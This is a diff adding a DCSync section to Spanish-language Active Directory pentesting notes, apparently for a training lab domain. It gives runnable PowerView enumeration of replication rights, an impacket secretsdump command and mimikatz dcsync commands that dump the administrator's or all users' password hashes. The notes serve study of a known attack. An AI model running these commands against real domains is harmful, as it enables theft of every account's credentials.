@@ -55,3 +55,36 @@ Supongamos que un usuario (`wley`) tiene un permiso `User-Force-Change-Password`
 Se crea un SPN falso asociado a la cuenta de usuario que queramos comprometer para craquear posteriormente. [[Kerberoasting#Kerberoasting dirigido| Revisar aquí]]
 
 ### DCSync
+Son parte de una ACL en AD. Estos privilegios permiten replicar datos del AD. Explota el protocolo Directory Replication Service (DRS), que utilizan los DC para sincronizar datos entre sí. En cuanto a obtención de información es equivalente a NTDS.dit
+#### Comprobar usuarios con permisos DCSync
+- Listar todos los usuarios ó grupos con permisos `DCSync`
+	```powershell
+	Get-DomainObjectAcl -SearchBase "DC=inlanefreight,DC=local" -ResolveGUIDs | ? {($_.ObjectType -match 'DS-Replication-Get-Changes|DS-Replication-Get-Changes-All')}
+	```
+- Comprobar si un usuario (`adunn`) tiene permisos DCSync sobre el dominio
+	```powershell
+	$sid = Convert-NameToSid adunn
+	# $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
+	Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+	# Opción chatgpt
+	Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? {($_.SecurityIdentifier -eq (Get-DomainUser adunn).SID)}
+	```
+#### Extraer hashes NTML y tickets kerberos - `secretsdump.py`
+
+```powershell
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@$target
+```
+- La flag `-just-dc` indica que debe extraer los hashes del archivo NTDS.dit
+- Devolverá 3 archivos
+#### Extraer hashes NTML y kerberos - `mimikatz`
+- Extraer el hash de administrador
+	```powershell
+	privilege::debug 
+	lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator 
+	# Ó con un solo paso y guardando el contenido 
+	mimikatz.exe "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator" > resultado.txt
+	```
+- Extraer los hashes de todos los usuarios: 
+	```powershell
+	`mimikatz.exe "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /all" > resultado.txt`
+	```
